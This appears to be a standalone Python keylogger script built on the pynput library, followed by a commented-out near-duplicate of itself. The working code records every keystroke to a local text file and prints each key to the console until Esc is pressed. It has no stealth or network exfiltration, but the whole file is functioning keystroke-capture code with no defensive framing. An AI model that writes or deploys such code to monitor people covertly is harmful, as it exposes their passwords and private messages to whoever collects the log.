from pynput.keyboard import Key, Listener

log_file = "key_log.txt"

def on_press(key):
    print(f"Key pressed: {key}")  # Debug print
    try:
        with open(log_file, "a") as f:
            try:
                f.write(f"{key.char}")
            except AttributeError:
                if key == Key.space:
                    f.write(" ")
                elif key == Key.enter:
                    f.write("\n")
                elif key == Key.tab:
                    f.write("\t")
                else:
                    f.write(f" [{key}] ")
    except Exception as e:
        print(f"Error writing to log file: {e}")

def on_release(key):
    print(f"Key released: {key}")  # Debug print
    if key == Key.esc:
        return False

if __name__ == "__main__":
    print("Starting keylogger...")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    print("Keylogger stopped.")




# from pynput.keyboard import Key, Listener

# log_file = "key_log.txt"

# def on_press(key):
#     print(f"Key pressed: {key}")  # Debug print
#     try:
#         with open(log_file, "a") as f:
#             try:
#                 f.write(f"{key.char}")
#             except AttributeError:
#                 if key == Key.space:
#                     f.write(" ")
#                 else:
#                     f.write(f" [{key}] ")
#     except Exception as e:
#         print(f"Error writing to log file: {e}")

# def on_release(key):
#     print(f"Key released: {key}")  # Debug print
#     if key == Key.esc:
#         return False

# if __name__ == "__main__":
#     print("Starting keylogger...")
#     with Listener(on_press=on_press, on_release=on_release) as listener:
#         listener.join()
#     print("Keylogger stopped.")
